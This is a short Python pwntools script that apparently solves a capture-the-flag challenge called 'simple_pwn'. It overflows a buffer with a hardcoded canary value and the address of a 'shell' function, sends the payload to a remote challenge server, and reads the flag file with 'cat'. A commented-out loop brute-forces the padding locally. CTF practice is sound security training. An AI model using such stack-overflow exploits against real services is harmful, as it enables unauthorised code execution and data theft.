from pwn import *
binary_path = './simple_pwn'
e = ELF(binary_path)
shell_addr = e.symbols['shell']
log.info('shell : ' + hex(shell_addr))
# Breakpoint 1, 0x080484fc in main ()
# (gdb) p check_canary
# $1 = 1804289318
check_canary = 1804289318
log.info('check_canary : ' + hex(check_canary))

# for i in range(10):
#     p = process('./simple_pwn')
#     print p.recv()
#     p.sendline(p32(check_canary)*i + p32(shell_addr))
#     print i
#     try:
#         print p.recv()
#     except EOFError:
#         continue

# p = process('./simple_pwn')
# print p.recv()
# p.sendline(p32(check_canary)*7 + p32(shell_addr))
# p.sendline('ls')
# print p.recv()
# p.sendline('cat flag')
# print p.recv()

# pwn.kysis.kr 5551
r = remote('pwn.kysis.kr', 5551)
r.send(p32(check_canary)*7 + p32(shell_addr))
r.sendline('asdf')
r.recvline(timeout=0.3)
r.sendline('cat /home/ubuntu/pwn/si*/f*')
log.success('FLAG : \033[92m' + r.recvline().strip() +'\033[00m')
# r.interactive()
